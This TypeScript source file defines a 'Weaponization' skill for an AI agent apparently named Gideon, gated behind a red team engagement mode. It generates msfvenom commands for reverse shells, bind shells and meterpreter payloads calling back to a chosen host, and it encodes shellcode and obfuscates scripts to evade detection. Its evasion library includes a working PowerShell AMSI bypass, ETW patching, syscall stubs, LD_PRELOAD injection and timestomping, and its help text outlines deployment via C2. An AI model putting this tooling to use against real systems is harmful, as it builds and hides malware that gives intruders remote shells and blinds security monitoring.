/**
 * Weaponization Skill
 *
 * Provides payload generation, obfuscation, and EDR evasion capabilities
 * for authorized red team engagements. Primarily wraps existing tools
 * (msfvenom, Sliver implant generation) with intelligent orchestration.
 *
 * Security: ALL operations require an active Red Team engagement.
 */

import {
  Skill,
  SkillCommand,
  SkillCommandContext,
  SkillCommandResult,
  SkillStatus,
} from '../types.js';
import { isRedTeamMode, getRedTeamManager } from '../../agent/redteam-mode.js';
import { getSandbox } from '../../engine/sandbox.js';

// ============================================================================
// Types
// ============================================================================

interface PayloadConfig {
  type: 'reverse_shell' | 'bind_shell' | 'stager' | 'meterpreter' | 'custom';
  os: 'windows' | 'linux' | 'macos';
  arch: 'x64' | 'x86' | 'arm64';
  format: 'exe' | 'dll' | 'elf' | 'macho' | 'ps1' | 'py' | 'raw' | 'c' | 'csharp';
  lhost: string;
  lport: number;
  encoder?: string;
  iterations?: number;
  badchars?: string;
}

interface ObfuscationConfig {
  stringEncryption: boolean;
  controlFlowObfuscation: boolean;
  junkCodeInsertion: boolean;
  variableRenaming: boolean;
  antiDebug: boolean;
  antiSandbox: boolean;
}

interface EvasionTechnique {
  name: string;
  description: string;
  targetOs: 'windows' | 'linux' | 'all';
  risk: 'low' | 'medium' | 'high';
  effectiveness: number; // 1-10
  implementation: string; // Code template or command
}

// ============================================================================
// Evasion Technique Library
// ============================================================================

const evasionTechniques: EvasionTechnique[] = [
  {
    name: 'AMSI Bypass',
    description: 'Patch Antimalware Scan Interface in memory to disable script scanning',
    targetOs: 'windows',
    risk: 'medium',
    effectiveness: 8,
    implementation: `# PowerShell AMSI bypass (memory-only, no disk artifacts)
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*siUtils"}
$f=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
[IntPtr]$ptr=$f.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)`,
  },
  {
    name: 'ETW Patching',
    description: 'Disable Event Tracing for Windows to prevent telemetry',
    targetOs: 'windows',
    risk: 'medium',
    effectiveness: 7,
    implementation: `# Patch EtwEventWrite to return immediately
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
  [System.Reflection.Assembly]::LoadWithPartialName("ntdll").GetModules()[0])
# Requires P/Invoke to patch the function prologue`,
  },
  {
    name: 'Direct Syscalls',
    description: 'Bypass userland API hooks by issuing syscalls directly',
    targetOs: 'windows',
    risk: 'low',
    effectiveness: 9,
    implementation: `// Use SysWhispers3 or similar for syscall stubs
// Avoids ntdll.dll hooks placed by EDR
// Example: NtAllocateVirtualMemory syscall stub
; SysWhispers3 generated stub for NtAllocateVirtualMemory
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, <syscall_number>
    syscall
    ret
NtAllocateVirtualMemory ENDP`,
  },
  {
    name: 'Process Hollowing',
    description: 'Replace a legitimate process memory with payload',
    targetOs: 'windows',
    risk: 'medium',
    effectiveness: 7,
    implementation: `// 1. Create legitimate process in suspended state
// 2. Unmap original executable
// 3. Allocate memory and write payload
// 4. Update thread context to point to payload
// 5. Resume process
// Tool: Donut + custom loader`,
  },
  {
    name: 'Thread Pool Injection',
    description: 'Queue payload execution via legitimate thread pool callbacks',
    targetOs: 'windows',
    risk: 'low',
    effectiveness: 8,
    implementation: `// Uses TpAllocWork and TpPostWork to execute payload
// through worker factory threads, avoiding CreateRemoteThread detection
// Newer technique, less signatures`,
  },
  {
    name: 'LD_PRELOAD Injection',
    description: 'Linux shared library injection via environment variable',
    targetOs: 'linux',
    risk: 'low',
    effectiveness: 7,
    implementation: `# Compile shared library with payload
gcc -shared -fPIC -o payload.so payload.c
# Inject into target process
LD_PRELOAD=./payload.so /target/binary`,
  },
  {
    name: 'Timestomping',
    description: 'Modify file timestamps to blend with legitimate files',
    targetOs: 'all',
    risk: 'low',
    effectiveness: 5,
    implementation: `# PowerShell timestomping
$file = Get-Item "payload.exe"
$date = Get-Date "01/01/2023 08:00:00"
$file.CreationTime = $date
$file.LastWriteTime = $date
$file.LastAccessTime = $date`,
  },
  {
    name: 'String Encryption',
    description: 'Encrypt all strings at compile time, decrypt at runtime',
    targetOs: 'all',
    risk: 'low',
    effectiveness: 6,
    implementation: `// XOR-encrypt strings with random key
// Decrypt at runtime just before use
// Prevents static signature matching on strings like "cmd.exe", URLs, etc.`,
  },
];

// ============================================================================
// Command Implementations
// ============================================================================

async function handleGenerate(
  args: string[],
  ctx: SkillCommandContext
): Promise<SkillCommandResult> {
  if (!isRedTeamMode()) {
    return { success: false, output: '', error: 'Requires active Red Team engagement.' };
  }

  const payloadType = args[0];
  const os = (args[1] || 'windows') as PayloadConfig['os'];
  const lhost = args[2];
  const lport = parseInt(args[3] || '443', 10);

  if (!payloadType || !lhost) {
    return {
      success: false,
      output: '',
      error: `Usage: payload generate <type> <os> <lhost> [lport]
Types: reverse_shell, bind_shell, stager, meterpreter
OS: windows, linux, macos
Example: payload generate reverse_shell windows 10.10.14.1 443`,
    };
  }

  // Map to msfvenom payload names
  const payloadMap: Record<string, Record<string, string>> = {
    reverse_shell: {
      windows: 'windows/x64/shell_reverse_tcp',
      linux: 'linux/x64/shell_reverse_tcp',
      macos: 'osx/x64/shell_reverse_tcp',
    },
    meterpreter: {
      windows: 'windows/x64/meterpreter/reverse_https',
      linux: 'linux/x64/meterpreter/reverse_tcp',
      macos: 'osx/x64/meterpreter/reverse_tcp',
    },
    stager: {
      windows: 'windows/x64/meterpreter/reverse_https',
      linux: 'linux/x64/meterpreter_reverse_tcp',
      macos: 'osx/x64/meterpreter_reverse_tcp',
    },
    bind_shell: {
      windows: 'windows/x64/shell_bind_tcp',
      linux: 'linux/x64/shell_bind_tcp',
      macos: 'osx/x64/shell_bind_tcp',
    },
  };

  const msfPayload = payloadMap[payloadType]?.[os];
  if (!msfPayload) {
    return {
      success: false,
      output: '',
      error: `Unsupported combination: ${payloadType} / ${os}`,
    };
  }

  // Format map
  const formatMap: Record<string, string> = {
    windows: 'exe',
    linux: 'elf',
    macos: 'macho',
  };

  const format = formatMap[os] || 'raw';
  const outputFile = `/tmp/gideon-payload-${Date.now()}.${format === 'elf' ? 'bin' : format}`;

  // Build msfvenom command
  const command = [
    'msfvenom',
    '-p', msfPayload,
    `LHOST=${lhost}`,
    `LPORT=${lport}`,
    '-f', format,
    '-o', outputFile,
    '--platform', os === 'macos' ? 'osx' : os,
    '-a', 'x64',
  ].join(' ');

  const lines = [
    `# Payload Generation\n`,
    `**Type:** ${payloadType}`,
    `**OS:** ${os}`,
    `**Payload:** ${msfPayload}`,
    `**Callback:** ${lhost}:${lport}`,
    `**Format:** ${format}`,
    `**Output:** ${outputFile}\n`,
    '## Command',
    '```bash',
    command,
    '```\n',
    '## Recommended Evasion Layers',
    '',
  ];

  // Recommend evasion techniques based on target OS
  const relevantTechniques = evasionTechniques
    .filter(t => t.targetOs === os || t.targetOs === 'all')
    .sort((a, b) => b.effectiveness - a.effectiveness)
    .slice(0, 5);

  for (const technique of relevantTechniques) {
    lines.push(`### ${technique.name} (effectiveness: ${technique.effectiveness}/10)`);
    lines.push(technique.description);
    lines.push('');
  }

  lines.push('\n> Run the msfvenom command via `execute_command` tool, then apply evasion with `payload evade`');

  getRedTeamManager().addAuditEntry({
    action: `Payload generation plan: ${payloadType} for ${os}`,
    category: 'payload',
    details: { payloadType, os, lhost, lport, msfPayload, format },
    result: 'success',
    riskLevel: 'critical',
  });

  return { success: true, output: lines.join('\n') };
}

async function handleEncode(
  args: string[],
  ctx: SkillCommandContext
): Promise<SkillCommandResult> {
  if (!isRedTeamMode()) {
    return { success: false, output: '', error: 'Requires active Red Team engagement.' };
  }

  const inputFile = args[0];
  const encoder = args[1] || 'x86/shikata_ga_nai';
  const iterations = parseInt(args[2] || '5', 10);

  if (!inputFile) {
    return {
      success: false,
      output: '',
      error: `Usage: payload encode <input-file> [encoder] [iterations]
Encoders: x86/shikata_ga_nai (default), x64/xor, x64/xor_dynamic, cmd/powershell_base64
Example: payload encode /tmp/payload.bin x86/shikata_ga_nai 10`,
    };
  }

  const outputFile = inputFile.replace(/\.[^.]+$/, `-encoded${inputFile.match(/\.[^.]+$/)?.[0] || '.bin'}`);

  const command = [
    'msfvenom',
    '-p', '-',
    '-f', 'raw',
    '-e', encoder,
    '-i', String(iterations),
    '<', inputFile,
    '>', outputFile,
  ].join(' ');

  const lines = [
    `# Shellcode Encoding\n`,
    `**Input:** ${inputFile}`,
    `**Encoder:** ${encoder}`,
    `**Iterations:** ${iterations}`,
    `**Output:** ${outputFile}\n`,
    '## Command',
    '```bash',
    command,
    '```\n',
    '> Multiple encoding passes help evade signature-based detection.',
    '> Consider combining with string encryption and anti-sandbox checks.',
  ];

  getRedTeamManager().addAuditEntry({
    action: `Shellcode encoding: ${encoder} x${iterations}`,
    category: 'payload',
    details: { inputFile, encoder, iterations },
    result: 'success',
    riskLevel: 'high',
  });

  return { success: true, output: lines.join('\n') };
}

async function handleEvasionList(
  args: string[],
  ctx: SkillCommandContext
): Promise<SkillCommandResult> {
  if (!isRedTeamMode()) {
    return { success: false, output: '', error: 'Requires active Red Team engagement.' };
  }

  const filterOs = args[0];

  const techniques = filterOs
    ? evasionTechniques.filter(t => t.targetOs === filterOs || t.targetOs === 'all')
    : evasionTechniques;

  const lines = [
    '# EDR Evasion Techniques\n',
    `Showing ${techniques.length} techniques${filterOs ? ` for ${filterOs}` : ''}\n`,
  ];

  for (const technique of techniques.sort((a, b) => b.effectiveness - a.effectiveness)) {
    const riskEmoji = technique.risk === 'low' ? '🟢' : technique.risk === 'medium' ? '🟡' : '🔴';
    lines.push(`## ${riskEmoji} ${technique.name}`);
    lines.push(`**OS:** ${technique.targetOs} | **Effectiveness:** ${'█'.repeat(technique.effectiveness)}${'░'.repeat(10 - technique.effectiveness)} ${technique.effectiveness}/10 | **Risk:** ${technique.risk}`);
    lines.push(technique.description);
    lines.push('```');
    lines.push(technique.implementation);
    lines.push('```\n');
  }

  return { success: true, output: lines.join('\n') };
}

async function handleObfuscate(
  args: string[],
  ctx: SkillCommandContext
): Promise<SkillCommandResult> {
  if (!isRedTeamMode()) {
    return { success: false, output: '', error: 'Requires active Red Team engagement.' };
  }

  const inputType = args[0]; // ps1, py, cs, c
  const inputFile = args[1];

  if (!inputType || !inputFile) {
    return {
      success: false,
      output: '',
      error: `Usage: payload obfuscate <type> <file>
Types: ps1 (PowerShell), py (Python), cs (C#), c (C)`,
    };
  }

  const obfuscationSteps: Record<string, string[]> = {
    ps1: [
      '1. Variable name randomization',
      '2. String concatenation splitting',
      '3. Base64 encoding of command blocks',
      '4. Invoke-Expression obfuscation',
      '5. Comment removal and whitespace normalization',
      '',
      'Tool: Invoke-Obfuscation',
      '```powershell',
      'Import-Module ./Invoke-Obfuscation.psd1',
      `Invoke-Obfuscation -ScriptPath ${inputFile} -Command 'Token\\All\\1' -Quiet`,
      '```',
    ],
    py: [
      '1. Variable and function name mangling',
      '2. String encryption with runtime decryption',
      '3. Code structure obfuscation',
      '4. Anti-decompilation techniques',
      '',
      'Tool: pyarmor or custom transformer',
      '```bash',
      `pyarmor gen --pack onefile ${inputFile}`,
      '```',
    ],
    cs: [
      '1. String encryption (AES)',
      '2. Control flow obfuscation',
      '3. Method name randomization',
      '4. Anti-debugging checks',
      '5. Metadata stripping',
      '',
      'Tool: ConfuserEx or custom Roslyn transforms',
      '```bash',
      `confuser -o ./output ${inputFile}`,
      '```',
    ],
    c: [
      '1. Macro-based string encryption',
      '2. Opaque predicates insertion',
      '3. Function inlining',
      '4. Dead code insertion',
      '',
      'Compile with anti-analysis flags:',
      '```bash',
      `x86_64-w64-mingw32-gcc -O2 -s -fno-ident -fno-asynchronous-unwind-tables ${inputFile} -o output.exe`,
      '```',
    ],
  };

  const steps = obfuscationSteps[inputType];
  if (!steps) {
    return { success: false, output: '', error: `Unsupported type: ${inputType}` };
  }

  const lines = [
    `# Obfuscation Plan: ${inputFile}\n`,
    `**Language:** ${inputType}`,
    `**Input:** ${inputFile}\n`,
    '## Obfuscation Steps\n',
    ...steps,
  ];

  getRedTeamManager().addAuditEntry({
    action: `Obfuscation plan: ${inputType} ${inputFile}`,
    category: 'payload',
    details: { inputType, inputFile },
    result: 'success',
    riskLevel: 'high',
  });

  return { success: true, output: lines.join('\n') };
}

async function handleWeaponizeHelp(
  args: string[],
  ctx: SkillCommandContext
): Promise<SkillCommandResult> {
  return {
    success: true,
    output: `# Weaponization Skill

Payload generation, obfuscation, and EDR evasion for authorized engagements.

## Commands

| Command | Description |
|---------|-------------|
| \`payload generate <type> <os> <lhost> [lport]\` | Generate a payload via msfvenom |
| \`payload encode <file> [encoder] [iterations]\` | Encode shellcode |
| \`payload obfuscate <type> <file>\` | Obfuscate source code (ps1/py/cs/c) |
| \`payload evade [os]\` | List EDR evasion techniques |

## Payload Types
- \`reverse_shell\` — Basic reverse shell
- \`bind_shell\` — Bind shell (listen on target)
- \`stager\` — Staged meterpreter (smaller initial payload)
- \`meterpreter\` — Full meterpreter reverse HTTPS

## Workflow

1. Generate base payload: \`payload generate reverse_shell windows 10.10.14.1 443\`
2. Encode shellcode: \`payload encode /tmp/payload.bin x86/shikata_ga_nai 10\`
3. Apply obfuscation: \`payload obfuscate cs loader.cs\`
4. Review evasion: \`payload evade windows\`
5. Deploy via C2: \`c2 upload <session> <payload> <remote-path>\``,
  };
}

// ============================================================================
// Skill Definition
// ============================================================================

const commands: SkillCommand[] = [
  {
    name: 'payload',
    description: 'Payload generation and weaponization',
    usage: 'payload <subcommand>',
    execute: async (args, ctx) => {
      const subcommand = args[0];
      const subArgs = args.slice(1);

      switch (subcommand) {
        case 'generate':
        case 'gen':
          return handleGenerate(subArgs, ctx);
        case 'encode':
        case 'enc':
          return handleEncode(subArgs, ctx);
        case 'obfuscate':
        case 'obf':
          return handleObfuscate(subArgs, ctx);
        case 'evade':
        case 'evasion':
          return handleEvasionList(subArgs, ctx);
        case 'help':
        default:
          return handleWeaponizeHelp(subArgs, ctx);
      }
    },
  },
];

export const weaponizationSkill: Skill = {
  metadata: {
    id: 'weaponization',
    name: 'Weaponization',
    description: 'Payload generation, obfuscation, shellcode encoding, and EDR evasion techniques',
    version: '1.0.0',
    author: 'Gideon',
    category: 'security-research',
    capabilities: {
      providesTools: false,
      requiresGpu: false,
      supportsCpuFallback: true,
      stateful: false,
      requiresExternalService: false,
    },
  },

  commands,

  async isAvailable(): Promise<boolean> {
    return isRedTeamMode();
  },

  async getStatus(): Promise<SkillStatus> {
    return {
      healthy: isRedTeamMode(),
      message: isRedTeamMode()
        ? 'Active — authorized engagement'
        : 'Inactive — requires Red Team mode',
      checkedAt: new Date(),
    };
  },

  async initialize(): Promise<void> {},
  async shutdown(): Promise<void> {},
};
